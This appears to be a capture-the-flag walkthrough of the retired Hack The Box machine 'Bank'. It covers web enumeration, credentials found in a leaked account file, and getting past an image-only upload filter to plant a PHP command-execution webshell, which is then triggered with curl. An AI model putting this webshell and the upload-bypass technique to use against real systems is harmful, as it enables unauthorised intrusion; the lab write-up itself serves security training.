- http://10.10.10.29/ - Apache2 Ubuntu landing page
- http://bank.htb/login.php - login page for the bank
- http://bank.htb/assets/
- http://bank.htb/balance-transfer/ - lots of .acc files here


There is one .acc file that is suspicious - its file size differs compared to the rest.
![](accFile.png)

```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Bank]
└─$ cat 68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HT<SNIP>0rd!## <---- (redacted for walkthrough)
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===

```

These credentials allow chris to log into the bank website.
http://bank.htb/support.php - allows tickets to be created and files to be uploaded.
![](ChrisUploadWebshell.png)

Appears to time out when uploading a shell. 
Uploading a test.txt gives:
![](CanOnlyUploadImages.png)

Changing file extension of webshell:
```
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ sudo cp -a php-reverse-shell.php php-reverse-shell.jpg
[sudo] password for kali: 

```

The webshell is 5kb and seems to struggle to upload.
A test.jpg (just ascii text) uploads fine.

https://bit-bandits.com/php_webshell_oneline.html

### Curling
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://bank.htb/support.php | grep debug
                                <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
                                                        
```

Changing the extension to .htb should do the trick.
```
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ cat simple_oneliner.htb
<?php system($_GET['cmd']); ?>

```

Uploaded

```
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ curl -s http://bank.htb/uploads/simple_oneliner.htb?cmd=whoami
www-data

```